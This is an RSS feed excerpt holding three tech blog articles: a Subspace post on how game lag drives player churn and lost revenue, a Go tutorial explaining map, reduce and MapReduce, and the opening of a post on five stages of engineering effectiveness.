href="https://www.researchgate.net/publication/220425928_How_sensitive_are_online_gamers_to_network_quality">study by ResearchGate</a> exploring player sensitivity to network quality, you can see the adverse effects network latency has on gameplay over time.</p></div><div data-block-type="5" id="block-yui_3_17_2_1_1614014215234_22708"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614014806841-RK504HJNERJIX369AZOR/ke17ZwdGBToddI8pDm48kJK4Mm1kch8SFO9ZNkN1NT97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmN9YSRtfoTLg6dUq-6F17A0FFZK5fArcnK1IqGweyunyWChwIwkIJ_P7MaZif-uMs/image6.png" data-image="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614014806841-RK504HJNERJIX369AZOR/ke17ZwdGBToddI8pDm48kJK4Mm1kch8SFO9ZNkN1NT97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmN9YSRtfoTLg6dUq-6F17A0FFZK5fArcnK1IqGweyunyWChwIwkIJ_P7MaZif-uMs/image6.png" data-image-dimensions="1080x1080" data-image-focal-point="0.5,0.5" alt="image6.png" data-load="false" data-image-id="6033e9559a5b89551b05b03b" data-type="image" src="https://www.subspace.com/blog/image6.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1614014215234_24056"><div><p><strong>For game publishers, this poses a significant problem. One vocal player with a bad experience can create a ripple effect throughout a game’s online community, especially if they have influence.</strong></p><p>Just this year, Call of Duty came under fire during their league playoff series when Trei “Zero” Morris experienced <em>“game-defining connection issues” </em>that ultimately led to his team, The London Royal Ravens losing their series.</p><p>This incident led to extensive <a href="https://www.espn.com/esports/story/_/id/29705750/call-duty-league-continues-connectivity-issues-playoffs">press coverage from ESPN</a> and a subsequent <a href="https://twitter.com/skrapzg/status/1296541281523568651?s=20">tweetstorm</a> led by Ravens player <a href="https://twitter.com/skrapzg?s=20">@skrapz</a><strong>—who, by the way, has 79,000 followers on Twitter</strong>.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1614014215234_28207"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614014966189-EP5LV49F1BXJ33CM8JDW/ke17ZwdGBToddI8pDm48kMw_TYhSJG2CznVP88DMG_t7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmpEfzMuPQaYRVRNSqbP0nCEaFSuz89K8EeUXtbCW9NL11Lw5leMYhyh_z4aP_UKU_/image3.png" data-image="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614014966189-EP5LV49F1BXJ33CM8JDW/ke17ZwdGBToddI8pDm48kMw_TYhSJG2CznVP88DMG_t7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmpEfzMuPQaYRVRNSqbP0nCEaFSuz89K8EeUXtbCW9NL11Lw5leMYhyh_z4aP_UKU_/image3.png" data-image-dimensions="1102x1340" data-image-focal-point="0.5,0.5" alt="image3.png" data-load="false" data-image-id="6033e9f54103c9750a126fe7" data-type="image" src="https://www.subspace.com/blog/image3.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1614014215234_29951"><div><p><strong>As this example perfectly illustrates, lag can put a game publisher in the press for all the wrong reasons.</strong></p><h3>How Lag Drives Game Abandonment and Community Churn</h3><p>As noted in <a href="https://venturebeat.com/2016/04/17/how-latency-is-killing-online-gaming/">this article from VentureBeat</a>, online gaming customers are twice as likely to abandon a game when they experience a network delay (latency) of 500 additional milliseconds. One of the reasons this is a major problem is that players are a very vocal group. They are notorious for letting the world know they are unhappy when poor network conditions ruin their experience.</p><p><strong>Now, imagine the impact someone with real influence and a massive following can have when they voice their displeasure with your game.</strong></p><p>That’s EXACTLY what happened when <a href="https://theblast.com/c/snoop-dogg-goes-off-on-bill-gates-ea-sports-when-madden-server-goes-down-video">Snoop Dogg exploded on EA Sports</a> when Madden servers crashed.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1614014215234_38706"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614015171408-TF6KAF2DGVCNRFD6OLWW/ke17ZwdGBToddI8pDm48kKttrfbZ0gMrYzGve7xMNah7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UZHWjT4nTCkdj4JvCo3b04UDVfEyAoFE3s0a5qqZWHReG6v6ULRah83RgHXAWD5lbQ/image4.png" data-image="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614015171408-TF6KAF2DGVCNRFD6OLWW/ke17ZwdGBToddI8pDm48kKttrfbZ0gMrYzGve7xMNah7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UZHWjT4nTCkdj4JvCo3b04UDVfEyAoFE3s0a5qqZWHReG6v6ULRah83RgHXAWD5lbQ/image4.png" data-image-dimensions="1999x1402" data-image-focal-point="0.5,0.5" alt="image4.png" data-load="false" data-image-id="6033eac0e6dc6a5f64959377" data-type="image" src="https://www.subspace.com/blog/image4.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1614014215234_40918"><div><p>His <a href="https://www.instagram.com/p/B--Xp__neI0/?utm_source=ig_web_copy_link">rant on Instagram</a> directly targeting EA Sports and Bill Gates now has 1.2 million views. That means 1.2 MILLION people were made aware of the server issues at EA Sports, many of whom chimed in voicing their own frustrations with the game.</p><p><strong>Not exactly the type of press any game publisher wants to attract.</strong></p><p>Now, consider the rise of livestreaming since lockdown began. We now see professional players and popular streamers with millions of fans tuning in to watch them play their favourite games.</p><p>What does this mean for game publishers?</p><p><strong>Streamers have the influence to negatively impact game downloads, gameplay, and community engagement when faced with lag and other connectivity issues.</strong></p><p>Consider these stats from a recent game survey our team at <a href="https://www.subspace.com/">Subspace</a> conducted that identified how players respond to lag interference:</p><ul data-rte-list="default"><li><p>32% of professional players (the people likely to have large streaming audiences) will stop playing a game altogether in response to lag.</p></li><li><p>42% of non-professional players react to lag by stopping gameplay.</p></li></ul><p>That means 74% (or 1,943) of total players surveyed stop playing a game when lag interferes.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1614014215234_53284"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614015326951-DVCVAOCUQ7ERNHP5AC7S/ke17ZwdGBToddI8pDm48kJQAkym-mVm4cWhsd70YmDAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcmkJKBQ_orImNc1CCogPv7mE8pAxih1FOawmp1hWUIKreiWO2XPvz4aLyXLHevgdd/image7.png" data-image="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614015326951-DVCVAOCUQ7ERNHP5AC7S/ke17ZwdGBToddI8pDm48kJQAkym-mVm4cWhsd70YmDAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcmkJKBQ_orImNc1CCogPv7mE8pAxih1FOawmp1hWUIKreiWO2XPvz4aLyXLHevgdd/image7.png" data-image-dimensions="1070x540" data-image-focal-point="0.5,0.5" alt="image7.png" data-load="false" data-image-id="6033eb5e5551ec775e951686" data-type="image" src="https://www.subspace.com/blog/image7.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1614014215234_54940"><div><p>The impact illustrated by these stats can be detrimental to game publishers if the players have big streaming audiences or large followings on social media.</p><p>Like what happened with Snoop Dogg, this can lead to bad press.</p><p><strong>But, the potential impact goes deeper than that.</strong></p><p>When players and the community at large lose interest and abandon games due to lag and connectivity issues, game publishers risk facing a decrease in the ability to generate revenue.</p><h3>The Impact Lag Has On Revenue Potential</h3><p>The way game publishers make money has changed.</p><p>In the past, physical sales drove the bottom line.</p><p><strong>Now, community engagement, in-game purchases, and digital sales drive profits</strong>.</p><p>So, when players, their friends, and the spectator community abandon a game, publishers’ ability to drive profits from these avenues severely decreases.</p><p>Let’s put this into perspective.</p><p>In 2020, <a href="https://www.pcgamesn.com/game-industry-revenue-2020">91% of the industry’s revenue of USD $174.9 billion revenue was made through digital sales, up from 79% in 2019</a>.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1614014215234_72897"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614015691456-4TAA4BHRXXFFWTYLITPA/ke17ZwdGBToddI8pDm48kGZwFzW5ZxHacfyzKAXWyqkUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcIVJtLXR86NJwdTrkWQL9k21b3OjGcf_Cex-qh8Isyp6i5zCyJbEi69BH9b5H2vuf/image2.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614015691456-4TAA4BHRXXFFWTYLITPA/ke17ZwdGBToddI8pDm48kGZwFzW5ZxHacfyzKAXWyqkUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcIVJtLXR86NJwdTrkWQL9k21b3OjGcf_Cex-qh8Isyp6i5zCyJbEi69BH9b5H2vuf/image2.jpg" data-image-dimensions="1193x672" data-image-focal-point="0.5,0.5" alt="image2.jpg" data-load="false" data-image-id="6033eccb2c847c14caf4423d" data-type="image" src="https://www.subspace.com/blog/image2.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1614014215234_80384"><div><p>What’s even more interesting is the rise of in-game purchases due to the popularity of free-to-play (F2P) games.</p><p>In fact, more than <a href="https://www.wepc.com/news/video-game-statistics/">85% of industry revenue comes from free-to-play games</a>.</p><p><strong>These in-game purchases include:</strong></p><ul data-rte-list="default"><li><p>enhancements (like additional lives)</p></li><li><p>currency</p></li><li><p>personalized avatars&nbsp;</p></li><li><p>ad-free experiences</p></li><li><p>unrestricted playing time</p></li></ul><p>Now, just imagine how much money is being left on the table when lag causes players and the spectator community to abandon games.</p><p><strong>Speaking of spectators…</strong></p><p>A 2016 study from Twitch claimed <a href="https://phys.org/news/2016-07-video-games-spectating-advertising.html">25% of game sales stemmed from spectators watching streams</a> of the game and making a purchase within 24 hours.</p><p>More interestingly, Twitch data scientist Danny Hernandez and his team found mid-tier Twitch streamers—those with audiences between 33 and 3,333 viewers—are responsible for 46% of game sales.</p><p>This is an incredible form of advertising for game publishers—and one that is threatened when lag causes players to abandon games and influence the spectator community.</p><p>You might be asking, <em>“ok, so what is the solution to this problem?</em>”</p><p>Well, let’s dive into that.</p><h3>How Game Publishers Are Solving Their Lag Problems Today</h3><p>Recognizing that lag and connectivity issues cannot continue to plague their games, major players in the gaming industry are now developing their own private networks or are looking at strategic partnerships to upgrade their networks and improve gameplay and player experience.</p><p>Riot Games recently accomplished this when they successfully created their own network for League of Legends players to play on.</p><p>The graph below shows improvements in the number of Riot Games players who play at under 80 ms ping since Riot created its own network.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1614014215234_112865"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614016194148-WDLSILUCE1GCCPEOPCKP/ke17ZwdGBToddI8pDm48kDEg7RTdH6B5QKjZhuO9yugUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcHDTY8UMmeobLkiD70Xc3UciUnXG25JCMM8KlnxJoXcw5PwMIpS6ZXlOHg-sXRVQ8/image1.png" data-image="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614016194148-WDLSILUCE1GCCPEOPCKP/ke17ZwdGBToddI8pDm48kDEg7RTdH6B5QKjZhuO9yugUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcHDTY8UMmeobLkiD70Xc3UciUnXG25JCMM8KlnxJoXcw5PwMIpS6ZXlOHg-sXRVQ8/image1.png" data-image-dimensions="1486x908" data-image-focal-point="0.5,0.5" alt="image1.png" data-load="false" data-image-id="6033eec17a59e16b1f48dfb2" data-type="image" src="https://www.subspace.com/blog/image1.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1614014215234_115710"><div><p>Although the outcome has been good, <a href="https://technology.riotgames.com/news/fixing-internet-real-time-applications-part-ii">Riot notes that creating a private network came with many difficulties, challenges, and risks</a>.</p><p>So, it’s obvious that industry leaders recognize the importance of player and community engagement and the need to invest in better network infrastructure.</p><p>You might be asking, <em>“so what are the solutions out there for publishers to leverage today?”</em></p><h3>The Future of Real-Time Online Gaming</h3><p><a href="https://www.subspace.com/">Subspace</a> is on a mission to significantly change the landscape of the games industry by providing game publishers with a platform to operate, deploy, and scale their games.</p><p>Our groundbreaking multiplayer network infrastructure and services platform provide the lowest latency, most reliable real-time, and fully controllable network possible for the world’s biggest games.</p><p><strong>What does this mean for you as a publisher?</strong></p><ul data-rte-list="default"><li><p>Expansion in playable latency</p></li><li><p>Increased matchmaking pool sizes</p></li><li><p>Improved player engagement</p></li><li><p>Decreased player churn</p></li><li><p>Increased revenue</p></li></ul><p><strong>How do we do it?</strong></p><p>We currently have infrastructure in hundreds of cities across the globe and continue to grow our presence.</p><p>Today, Subspace has millions of players on our platform playing on PC, Playstation, Xbox, Switch, iOS, and …</p></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.subspace.com/blog/why-its-a-mistake-for-publishers-to-treat-player-complaints-as-white-noise">https://www.subspace.com/blog/why-its-a-mistake-for-publishers-to-treat-player-complaints-as-white-noise</a></em></p>]]>
            </description>
            <link>https://www.subspace.com/blog/why-its-a-mistake-for-publishers-to-treat-player-complaints-as-white-noise</link>
            <guid isPermaLink="false">hacker-news-small-sites-26230258</guid>
            <pubDate>Mon, 22 Feb 2021 20:38:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MapReduce – munching through Big Data (2016)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26230003">thread link</a>) | @wilsonfiifi
<br/>
February 22, 2021 | https://appliedgo.net/mapreduce/ | <a href="https://web.archive.org/web/*/https://appliedgo.net/mapreduce/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><em>It’s been a while since the last post, and I have to apologize for the long wait. The last weeks have been quite busy, but I finally managed to complete another article. I hope you’ll enjoy it.</em></p>
<h2 id="map-and-reduce">Map and Reduce</h2>
<p>This is going to be a boring article about two boring functions, <code>map()</code> and <code>reduce()</code>. Here is the story:</p>
<p>You have a list with elements of type, say, <code>string</code>.</p>
<p>You define a function that takes a <code>string</code> and produces an <code>int</code>. Let’s say you want to know the length of a string.</p>
<div><pre><code data-lang="go"><span>func</span> <span>length</span>(s <span>string</span>) <span>int</span> {
	<span>return</span> <span>len</span>(s)
}
</code></pre></div><p>Now you define a function called <code>map()</code> that takes this function and applies it to each of the elements in the list and returns a list of all results.</p>
<div><pre><code data-lang="go"><span>func</span> <span>mäp</span>(list []<span>string</span>, fn <span>func</span>(<span>string</span>)<span>int</span>) []<span>int</span> { <span>// "map" is a reserved word, "mäp" isn't
</span><span></span>	res <span>:=</span> <span>make</span>([]<span>int</span>, <span>len</span>(list))
	<span>for</span> i, elem <span>:=</span> <span>range</span> list {
		res[i] = <span>fn</span>(elem)
	}
	<span>return</span> res
}
</code></pre></div><p>Finally, you define another function <code>reduce()</code> that takes the result list and boils it down to a single result..</p>
<div><pre><code data-lang="go"><span>func</span> <span>reduce</span>(list []<span>int</span>, fn <span>func</span>(<span>int</span>, <span>int</span>)<span>int</span>) (res <span>int</span>) {
	<span>for</span> _, elem <span>:=</span> <span>range</span> list {
		res = <span>fn</span>(res, elem)
	}
	<span>return</span> res
}

<span>func</span> <span>sum</span>(a,b <span>int</span>) <span>int</span> {
	<span>return</span> a<span>+</span>b
}
</code></pre></div><p>Now you can wire it all up.</p>
<div><pre><code data-lang="go"><span>func</span> <span>main</span>() {
	list <span>:=</span> []<span>string</span>{<span>"a"</span>, <span>"bcd"</span>, <span>"ef"</span>, <span>"g"</span>, <span>"hij"</span>}
	res <span>:=</span> <span>reduce</span>(<span>mäp</span>(list, len), sum)
	fmt.<span>Println</span>(res)
}
</code></pre></div><p><a href="https://play.golang.org/p/P7-1ro4a_d">(Playground link)</a></p>
<p>Here is the whole thing visualized. (Click on Play to start the animation.)</p>


<p>That’s it. End of the story. Pretty boring, eh?</p>
<h2 id="but-wait-">But wait! …</h2>
<p>… what’s this?</p>
<p><strong>Looks like we just abstracted away the concept of <code>for</code> loops!</strong></p>
<p>Now if that’s not something to brag about on the next Gopher meetup…</p>
<p>However, does this buy us anything else? Indeed it does:</p>
<ul>
<li>
<p>First, no more one-off index errors.</p>
</li>
<li>
<p>Second, and more importantly, if the mapped function <code>fn</code> does not depend on previous results, it can be trivially called in a concurrent manner.</p>
</li>
</ul>
<p>How to do this? Easy: Split the list into <em>n</em> pieces and pass them to <em>n</em> independently running mappers. Next, have the mappers run on separate CPU cores, or even on separate CPU’s.</p>
<p>Imagine the speed boost you’ll get. Map and reduce, as it seems, form a fundamental concept for efficient distributed loops.</p>
<blockquote>
<p>Lemme repeat that. By abstracting away the very concept of looping, you can implement looping any way you want, including implementing it in a way that scales nicely with extra hardware.</p>
<p>Joel Spolsky, <a href="http://www.joelonsoftware.com/items/2006/08/01.html">Can Your Programming Language Do This?</a> (2006)</p>
</blockquote>
<h2 id="from-map-and-reduce-to-mapreduce">From map() and reduce() to MapReduce</h2>
<p>Google researchers took the map/reduce concept and scaled it up to search engine level (I leave the exact definition of “search engine level” as an exercise for the reader). <a href="http://research.google.com/archive/mapreduce.html">MapReduce was born</a>.</p>
<p>The result was a highly scalable, fault-tolerant data processing framework with the two functions <code>map()</code> and <code>reduce()</code> at its core.</p>
<p>Here is how it works.</p>
<p>Let’s say we have a couple of text files and we want to calculate the average count of nouns &amp; verbs per file.</p>
<p>Our imaginary test machine has eight CPU cores. So we can set up eight processing entities/work units/actors (or whatever you want to call them):</p>
<ul>
<li>One input reader</li>
<li>Three mappers</li>
<li>One shuffler, or partitioner</li>
<li>Two reducers</li>
<li>One output writer</li>
</ul>
<h3 id="the-input-reader">The input reader</h3>
<p>The input reader fetches the documents, turns each one into a list of words, and distributes the lists among the mappers.</p>
<h3 id="the-mapper">The mapper</h3>
<p>Each of the mappers reads the input list word by word and counts the nouns and verbs in that list.</p>
<p>The result is a key-value list of word types (noun, verb) and counts. For example, our three mappers could return these counts:</p>
<pre><code>mapper 1:
    nouns: 7
    verbs: 4

mapper 2:
    nouns: 5
    verbs: 8

mapper 3:
    nouns: 6
    verbs: 3
</code></pre>
<p>When a mapper has finished, it passes the result on to the shuffler.</p>
<h3 id="the-shuffler">The shuffler</h3>
<p>The shuffler receives the output lists from the mappers. It rearranges the data by key; that’s why it is also referred to as “partitioning function”. In our example, the shuffler generates two lists, one for nouns and one for verbs:</p>
<pre><code>list 1:
    nouns: 7
    nouns: 5
    nouns: 6

list 2:
    verbs: 4
    verbs: 8
    verbs: 3
</code></pre>
<p>The shuffler then passes each list to one of the two reducers.</p>
<h3 id="the-reducer">The reducer</h3>
<p>Each reducer receives a list with a couple of counts. It simply runs through the list, adds up all the counts, and divides the result by the number of counts. Both reducers then send their output to the output writer.</p>
<p>Back to our example. The first reducer would calculate an average of</p>
<pre><code>(7 + 5 + 6) / 3 = 6
</code></pre>
<p>and the other one would return</p>
<pre><code>(4 + 8 + 3) / 3 = 5
</code></pre>
<h3 id="the-output-writer">The output writer</h3>
<p>All the output writer has to do is collecting the results from the reducers and write them to disk or pass them on to some consumer process.</p>
<h3 id="summary">Summary</h3>
<p>To make all this less abstract, here is the same as an animation. (Click on Play.)</p>


<p>This concept easily scales beyond a single multi-CPU machine. The involved entities - input reader, mapper, shuffler, reducer, and output writer - can even run on different machines if required.</p>
<p>But MapReduce is more than just some distributed version of <code>map()</code> and <code>reduce()</code>. There are a couple of additional bonuses that we get from a decent MapReduce implementation.</p>
<ul>
<li>A good deal of the functionality is the same for any kind of map/reduce task. These parts can be implemented as a MapReduce framework where the user just needs to provide the <code>map</code> and <code>reduce</code> functions.</li>
<li>The MapReduce framework can provide fault recovery. If a node fails, the framework can re-execute the affected tasks on another node.</li>
<li>With fault tolerance mechanisms in place, MapReduce can run on large clusters of commodity hardware.</li>
</ul>
<h2 id="the-code">The code</h2>
<p>The code below is a very simple version of the noun/verb average calculation. To keep the code short and clear, the mapper does not actually identify nouns and verbs. Instead, the input text is just a list of strings that read either “noun” or “verb”. Also, the reducer does not receive key/value pairs but rather just the values. We already know that one reducer receives the nouns and the other receives the verbs.</p>
</div></div>]]>
            </description>
            <link>https://appliedgo.net/mapreduce/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26230003</guid>
            <pubDate>Mon, 22 Feb 2021 20:18:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What We Learned About Engineering Effectiveness Talking to Hundreds of CTOs]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26229974">thread link</a>) | @tonioab
<br/>
February 22, 2021 | https://www.okayhq.com/blog/the-5-stages-of-engineering-effectiveness | <a href="https://web.archive.org/web/*/https://www.okayhq.com/blog/the-5-stages-of-engineering-effectiveness">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Over the last decade, <a href="https://www.linkedin.com/in/tomasrb/" rel="nofollow noopener noreferrer" target="_blank">my cofounder</a> and <a href="https://www.linkedin.com/in/antoineboulanger/" rel="nofollow noopener noreferrer" target="_blank">I</a> have engaged in hundreds of conversations with engineering leaders on our journey to improve engineering. We talked with Silicon Valley startups just getting started as well as established enterprises with thousand-person headcounts.</p>
<p>What we discovered surprised us: <strong>Not only can software engineering effectiveness be measured; most engineering teams follow the exact same evolution.</strong></p>
<p>From a two-person startup to a thousand-person team, engineering success always comes from the same fundamentals: 1) Hire excellent engineers and 2) <a href="https://www.okayhq.com/blog/engineering-productivity-can-be-measured" rel="nofollow noopener noreferrer" target="_blank">Remove the blockers that prevent their success</a>.</p>
<p>Different team sizes, however, change the ways these fundamentals manifest. Broadly, they fit into five stages:</p>
<ul>
<li>Qualitative</li>
<li>Data-Curious</li>
<li>People-Driven Engineering Effectiveness</li>
<li>Software-Driven Effectiveness</li>
<li>Engineering Effectiveness as a Strategic Advantage</li>
</ul>
<p><img src="https://www.okayhq.com/assets/img/5_stages_o.a91f2d0.png" alt="The 5 stages of Engineering Effectiveness"></p><p>While you're perusing these stages, keep in mind that every engineering org starts somewhere and every org can reach stage 5. Regardless of the size or age of your team, your engineering effectiveness would benefit from:</p>
<ol>
<li>Objectively assessing your current engineering org: What stage are you in and why?Â&nbsp;</li>
<li>Solidifying a strong foundation: Ensure you've built all the components of your current and lower stages.Â&nbsp;</li>
<li>Aiming higher: Add advanced functions to accelerate your achievement.Â&nbsp;Â&nbsp;</li>
</ol>
<p>Of course, individual organizations have their own unique traits, so you should feel free to make this framework your own. On the whole, however, here's how to grow:Â&nbsp;</p>
<h2 id="stage-1-qualitative">Stage 1: Qualitative</h2>
<p>Most engineering teams start small. At this point (usually around 1-20 people), the team is evolving rapidly and there aren't many objective metrics to measure success.</p>
<p><strong>In stage 1, the most successful engineering organizations build a strong social, cultural, and behavioral foundation.</strong> This foundation should include implementing widely-known best practices like:</p>
<ul>
<li><a href="https://www.scrum.org/resources/what-is-a-sprint-retrospective" rel="nofollow noopener noreferrer" target="_blank">Sprint retrospectives</a> to identify patterns of effectiveness</li>
<li><a href="https://en.wikipedia.org/wiki/Test-driven_development" rel="nofollow noopener noreferrer" target="_blank">Test-driven development</a> and version control with small, frequent commits</li>
<li>Flexible hours with high employee autonomy</li>
</ul>
<p>With stage 1 being almost metric-free, engineering success relies almost entirely on your first-line managers.  We've found these managers to be the differentiators between successful stage 1 orgs and those that flounder. If your org is in stage 1, be on the lookout for strong managers: ones who are either experienced and well-trained or inexperienced but exceptionally fast learners.</p>
<p>To support a stage 1 engineering org, company leadership should create a high-trust environment in team meetings/all hands (to encourage feedback) and keep a pulse on morale through high-quality one-on-ones. It's also helpful for long-term culture to invest in manager growth and development, particularly around people skills and EQ. (We've found <a href="https://rework.withgoogle.com/guides/managers-develop-and-support-managers/steps/introduction/" rel="nofollow noopener noreferrer" target="_blank">Google's framework</a> to be particularly effective at helping managers become <a href="https://en.wikipedia.org/wiki/Servant_leadership" rel="nofollow noopener noreferrer" target="_blank">servant leaders</a>.)</p>
<p>In stage 1, engineering revolves around culture: you'll succeed if your managers can support and align your team.Â&nbsp;Â&nbsp;</p>
<h2 id="stage-2-data-curious-and-reactive">Stage 2: Data-Curious and Reactive</h2>
<p><strong>Stage 2 is when most orgs first become aware of engineering effectiveness as an area to improve, so they start dabbling in data.</strong></p>
<p>As most stage 2 orgs are small and fast-growing (20-50 people), they must still rely heavily on first-line managers for qualitative measures like:Â&nbsp;</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/OKR" rel="nofollow noopener noreferrer" target="_blank">OKR</a> completion</li>
<li>Team engagement</li>
<li>Hiring targets</li>
</ul>
<p>Stage 2 will also bring your first quantitative measures, typically in the form of ad hoc metrics like:Â&nbsp;</p>
<ul>
<li>Bug counts</li>
<li>Alert rates</li>
<li>Employee satisfaction surveys</li>
</ul>
<p>On the dev ops side, successful stage 2 orgs typically begin investing in a pipeline aimed at achieving continuous delivery. These investments often include custom scripts or open-source tools that provide snapshots of their DORA metrics.</p>
<p>These instantaneous measurements and metrics help make stage 2 engineering orgs more effective than those in stage 1. That said, these stage 2 improvements are typically ad hoc, one-off, and isolated. Instead of a comprehensive, real-time dashboard or even a long-term feedback loop, stage 2 orgs act on instantaneous information as it arises, necessarily making the org's improvements reactive.</p>
<h2 id="stage-3-people-driven-engineering-effectiveness">Stage 3: People-Driven Engineering Effectiveness Â&nbsp;</h2>
<p>The typical stage 3 engineering org will have 50-250 engineers and feel like it's in a transition stage between independent qualitative assessments and fully-automated metrics.Â&nbsp;</p>
<p><strong>In stage 3, the best engineering teams establish a dedicated function for engineering effectiveness</strong>, most frequently through a dedicated internal team or by hiring an engineering chief of staff. This dedicated function will begin to make:</p>
<ul>
<li>A regular cadence of investments in dev tech, processes, and tooling</li>
<li>Looker dashboards to capture DORA metrics in real time</li>
<li><a href="https://cloud.google.com/blog/products/gcp/sre-fundamentals-slis-slas-and-slos" rel="nofollow noopener noreferrer" target="_blank">SLAs/SLOs</a> for engineering effectiveness</li>
<li>Tangible, objectively-verifiable effectiveness metrics that will hold managers accountableÂ&nbsp;</li>
</ul>
<p><strong>While stage 3 brings both long-term metrics and systems that provide a holistic view, most of these activities will be performed by hand.</strong> For example, the engineering Chief of Staff or program manager might ask directors to fill out a spreadsheet, which will then evolve into a powerpoint presentation that prompts the VP to make adjustments.</p>
<p><strong>A successful stage 3 engineering org will implement a dedicated engineering effectiveness team to measure metrics and incorporate adjustments at a reliable cadence.</strong></p>
<h2 id="stage-4-software-driven-effectiveness">Stage 4: Software-Driven Effectiveness</h2>
<p><strong>In stage 4, dedicated software enters the picture, bringing continuous improvement to every engineering stage.</strong></p>
<p>The typical stage 4 engineering org will have hundreds or thousands of engineers. At this scale, treating engineering like a black box is no longer acceptable. Instead, managers will require precise, quantitative assessments instead of qualitative or imprecise measures.</p>
<blockquote>
<p>The most successful stage 4 teams automate a high variety of engineering metrics, either through dashboards built by a full-time engineering effectiveness team or by leveraging <a href="https://www.okayhq.com/" rel="nofollow noopener noreferrer" target="_blank">third-party software</a></p>
</blockquote>
<p>These dashboards gather actionable, real-time effectiveness metrics at every level of management:</p>
<ol>
<li>The CTO sets high-level metrics and goals, typically through a dashboard they share with the other executives.Â&nbsp;</li>
